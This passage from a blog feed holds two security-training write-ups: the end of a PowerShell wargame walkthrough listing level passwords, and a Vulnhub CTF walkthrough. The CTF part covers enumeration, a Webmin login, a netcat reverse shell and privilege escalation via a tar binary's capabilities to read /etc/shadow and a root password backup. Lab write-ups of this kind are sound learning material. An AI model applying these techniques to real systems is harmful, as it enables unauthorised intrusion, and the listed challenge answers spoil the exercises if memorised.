+<p>I then used the cmdlet ‘Get-Module -ListAvailable’ to see all the modules. From there, I could have just looked through them all for the version number, but I wanted to challenge myself.</p>
+
+<p>I used ‘Select-Object’ to pull out what I needed, which was the version number and name. And then I used ‘Select-String’ to find the exact version number.</p>
+
+<p>The password was bacon_eggs</p>
+
+<p>Cyborg 5</p>
+
+<p>“The password for cyborg6 is the last name of the user who has logon hours set on their account PLUS the name of the file on the desktop.”</p>
+
+<p>I used Get-ChildItem to get the name of the file</p>
+
+<p>I needed the last name of a user who has logon hours set. I just took a wild guess and used ‘Get-ADUser -Filter {logonHours -like ‘*’}, and that returned two users. I did not think it would be the administrator, so I guessed the second user.</p>
+
+<p>And I was correct. The password was rowray_timer.</p>
+
+<p>Cyborg 6</p>
+
+<p>“The password for cyborg7 is the decoded text of the string within the file on the desktop.”</p>
+
+<p>https://www.sans.org/blog/month-of-powershell-profile-hack-base64-encoding-decoding/</p>
+
+<p>This one required some research on how to encode/decode base64 in PowerShell, and I included the resource I used in the link above. It also explains much better than I could how it works.</p>
+
+<p>The first thing I did was open the file. The encoding was base64. I used the link above to figure out how to decode it.</p>
+
+<p>The password was cybergeddon.</p>
+
+<p>Cyborg 7</p>
+
+<p>“The password for cyborg8 is the executable name of a program that will start automatically when cyborg7 logs in.”</p>
+
+<p>https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-startupcommand</p>
+
+<p>This one I used the above link to figure out how to get the information I needed. Basically, I was looking for the Win32_StartUpCommand, which is the class of commands that run whenever a user logs in. To access that command, I needed to use the ‘Get-WMIObject’ cmdlet.</p>
+
+<p>The password was skynet.</p>
+
+<p>Cyborg 8</p>
+
+<p>“The password for cyborg9 is the Internet zone that the picture on the desktop was downloaded from.”</p>
+
+<p>https://devblogs.microsoft.com/scripting/powertip-use-powershell-3-0-to-identify-zone-information-of-files/</p>
+
+<p>For this one, I used the above link to figure out how to get to the internet zone, because coming into this I really had no idea how to find that.</p>
+
+<p>Essentially for this one, it took two cmdlets.</p>
+
+<p>The first one was the above cmdlet, which is using the ‘Get-Item’ cmdlet, and specifying the Stream parameter as ‘zone*’. I used the wildcard because I did not know the name yet.</p>
+
+<p>After I found the name, I used the ‘Get-Content’ cmdlet to get more info.</p>
+
+<p>The password was 4.</p>
+
+<p>Cyborg 9</p>
+
+<p>“The password for cyborg10 is the first name of the user with the phone number of 876–5309 listed in Active Directory PLUS the name of the file on the desktop.”</p>
+
+<p>I used Get-ChildItem to find the name of the file.</p>
+
+<p>This one took a lot of playing around with the phone number parameter. I first put in ‘phoneNumber’, for instance. I eventually figured out that I had to use the filter ‘telephoneNumber’.</p>
+
+<p>The password was onita99.</p>
+
+<p>Cyborg 10</p>
+
+<p>“The password for cyborg11 is the description of the Applocker Executable deny policy for ill_be_back.exe PLUS the name of the file on the desktop.”</p>
+
+<p>https://learn.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2022-ps</p>
+
+<p>I used Get-ChildItem to find the name of the file.</p>
+
+<p>There is a helpful cmdlet that gets the Applocker policy. It is called Get-ApplockerPolicy. I used the above link to figure out how to use it in this context.</p>
+
+<p>This essentially just puts it into an XML format. XML is a format for storing data.</p>
+
+<p>The password was terminated!99.</p>
+
+<p>Cyborg 11</p>
+
+<p>“The password for cyborg12 is located in the IIS log. The password is not Mozilla or Opera.”</p>
+
+<p>Through the power of Google, I have found that the IIS logs are located in c:\inetpub\logs\LogFiles. When I went there, there was one directory. I went into that directory, and found one file. I used the cmdlet ‘Get-Content’, then used the ‘Select-String’ cmdlet to exclude anything that didn’t match Opera or Mozilla.</p>
+
+<p>The password was spaceballs.</p>
+
+<p>Cyborg 12</p>
+
+<p>“The password for cyborg13 is the first four characters of the base64 encoded full path to the file that started the i_heart_robots service PLUS the name of the file on the desktop.”</p>
+
+<p>https://adsecurity.org/?p=478</p>
+
+<p>I used the above link to figure out how to encode in base64 in PowerShell.</p>
+
+<p>I first used Get-ChildItem to find the name of the file.</p>
+
+<p>I then used the below cmdlet to figure out the path name.</p>
+
+<p>I followed along with the above link to figure out what to do next.</p>
+
+<p>The password was ywa6_heart.</p>
+
+<p>Cyborg 13</p>
+
+<p>“The password cyborg14 is the number of days the refresh interval is set to for DNS aging for the underthewire.tech zone PLUS the name of the file on the desktop.”</p>
+
+<p>I used Get-ChildItem for the file on the desktop.</p>
+
+<p>Then, using get-help, I found a useful cmdlet, ‘Get-DnsServerZoneAging’, which was exactly what I needed.</p>
+
+<p>The password was 22_days</p>
+
+<p>Cyborg 14</p>
+
+<p>“The password for cyborg15 is the caption for the DCOM application setting for application ID {59B8AFA0–229E-46D9-B980-DDA2C817EC7E} PLUS the name of the file on the desktop.”</p>
+
+<p>I used Get-ChildItem to find the file on the desktop.</p>
+
+<p>The next step took a lot of googling as well, but I found that using the below cmdlet to get the DCOM application setting. The hardest part was figuring out how the filter for the application ID would work. To figure that out, I just ran the below cmdlet without the filter to see what field the application ID would be named.</p>
+
+<p>The password was propshts_objects.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[In this post, I am going to be continuing my PowerShell training with a walkthrough of Under the Wire’s Cyborg. The goal of each level is to find the password for the next level using PS. I already have a walkthrough of the previous game, Century. To play these games, you will need an SSH client. I used the recommended Putty.]]></summary></entry><entry><title type="html">Vulnhub Empire: Breakout</title><link href="http://localhost:4000/post/hacking/2023/04/25/empire_breakout.html" rel="alternate" type="text/html" title="Vulnhub Empire: Breakout" /><published>2023-04-25T06:00:00-04:00</published><updated>2023-04-25T06:00:00-04:00</updated><id>http://localhost:4000/post/hacking/2023/04/25/empire_breakout</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/04/25/empire_breakout.html"><![CDATA[<p>Vulnhub Empire: Breakout Walkthrough
+This post is going to be a walkthrough of the vulnhub machine Empire: Breakout. Although this machine was rated as an easy machine, there were still some challenges.</p>
+
+<p>After setting up the machine, the first thing I did was make a directory to keep all the information I collected during the enumeration phase. This is more of a preference than a requirement, but I did a lot of enumeration in this, and I did not want to keep running those commands.</p>
+
+<p>This was an nmap scan of the network to discover the IP address of the machine. I found that the IP address was 192.168.56.26, and I found that ports 80, 139, 445, 10000, and 20000 were open. Notably in my opinion, SSH on port 22 was not open.</p>
+
+<p>I then went to the web application to see if there was anything I could find. I was specifically looking for login pages or some kind of command line interface.</p>
+
+<p>The first page I came across was a default Apache2 page. There was nothing notable on the page itself, but I viewed the page source and found an encrypted message there.</p>
+
+<p>This message was the part that caused me a lot of issues. The message itself was pretty clear that the encrypted message was a password, however I did not recognize the encryption algorithm. I wanted to look for some kind of login page and a username before I tried to decrypt the message.</p>
+
+<p>The next thing I wanted to do was to see if I could enumerate the SMB that was open on the target machine. SMB is Server Message Block, and is a file sharing protocol. Enum4linux is a command line tool that can enumerate SMB. To use it, you can just type ‘enum4linux <IP Address="">’.</IP></p>
+
+<p>Scrolling through the information (there was a lot) got me a username, ‘cyber’. So at this point I had a username and an encrypted password.</p>
+
+<p>To find more information, I needed to perform some more enumeration. I did a second nmap scan with the -sV option to get the service versions of all the protocols running.</p>
+
+<p>HTTP was running on the target machine on ports 80, 10000, and 20000. It was running Webmin, which is a web based admin tool for Unix.</p>
+
+<p>I also ran a dirb scan to see if there were any directories I could visit, but that didn’t give me anything useful.</p>
+
+<p>I visited the web application on port 10000, and I found a login page. I found the same login page when I visited port 20000.</p>
+
+<p>Now was the time I tried to decrypt the message, since I had both a login page and a username. This was the part that gave me the most trouble, since I didn’t recognize the encryption. I actually looked up another walkthrough in order to figure this part out, because I was completely stuck.</p>
+
+<p>I found out that the algorithm wasn’t actually an encryption algorithm, it was an esoteric programming language called Brainfuck. An esoteric programming language is, from what I found, a programming language that is intentionally hard to understand. I found this writeup and tutorial if you want to read more about it.</p>
+
+<p>Using decode.fr/brainfuck-language, I got the password.</p>
+
+<p>I went back to 192.168.56.26:20000 and entered all the information, and I got into the system.</p>
+
+<p>I looked around the interface and under login, I found a command shell. I ran whoami, id, ls, and I found the first flag.</p>
+
+<p>I used this to establish a reverse shell. I set up a netcat listener on my Kali machine, and I used nc on the victim command shell to connect to the listener. And I gave myself a bit more control by spawning a TTY Shell.</p>
+
+<p>The next step was to get to the root user in order to get the second flag. I ran sudo -l to see what commands I would be able to run as the sudo user, but the sudo command was not found.</p>
+
+<p>I then ran ‘find / -perm -u=s -type f 2&gt;/dev/null’ to see if there were any binaries that I could use, but that also did not give me much.</p>
+
+<p>I also tried to see if I could open the /etc/shadow file, but that was also denied.</p>
+
+<p>In the home directory of cyber, there is a binary called ‘tar’. I ran ‘whereis tar’ to see if the tar command was on the machine. It was, and checking further, I found that the binary in the home directory is just the tar command. I used the getcap command on the binary to find out more information.</p>
+
+<p>I found that basically means I could use this to read any files. I first did this to try to get the /etc/shadow file. I wanted to try to crack the password using john the ripper. However, that didn’t work because no wordlist I had contained the password. I decided to look around the machine to find something.</p>
+
+<p>The next part took a long time, but I eventually found something in the /var/backups directory. There was a hidden file called old_pass.bak. I used the tar binary to get the contents of that file.</p>
+
+<p>And that was the root password. I used that to switch to root, went to the root directory, and got the final flag.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[Vulnhub Empire: Breakout Walkthrough This post is going to be a walkthrough of the vulnhub machine Empire: Breakout. Although this machine was rated as an easy machine, there were still some challenges.]]></summary></entry></feed>
